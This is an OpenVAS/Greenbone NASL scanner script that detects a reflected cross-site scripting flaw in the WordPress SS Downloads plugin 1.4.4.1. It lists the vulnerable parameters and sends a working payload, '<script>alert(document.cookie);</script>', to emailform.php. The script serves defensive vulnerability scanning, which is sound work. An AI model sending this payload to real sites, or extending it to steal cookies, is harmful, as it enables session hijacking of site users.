CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804081" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_bugtraq_id( 65141 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2014-01-28 13:07:10 +0530 (Tue, 28 Jan 2014)" );
	script_name( "WordPress SS Downloads Multiple Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress SS Downloads Plugin and is prone to
multiple cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'file', 'title', and 'postid' parameters to emailandname
form.php, emailform.php, emailsent.php, register.php, and download.php scripts
and 'emails_and_names' and 'ssdshortcode' parameters to ss-downloads.php and
'file' parameter to  services/getfile.php script are not properly sanitized
before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress SS Downloads Plugin version 1.4.4.1, Other versions may also be
affected." );
	script_tag( name: "solution", value: "Upgrade WordPress SS Downloads to version 1.5 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/56532" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124958" );
	script_xref( name: "URL", value: "https://plugins.trac.wordpress.org/changeset/842702" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-ss-downloads-cross-site-scripting" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/ss-downloads" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/ss-downloads/templates/emailform.php?" + "file=\"/><script>alert(document.cookie);</script>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>", extra_check: "ss-downloads\">" )){
	security_message( http_port );
	exit( 0 );
}

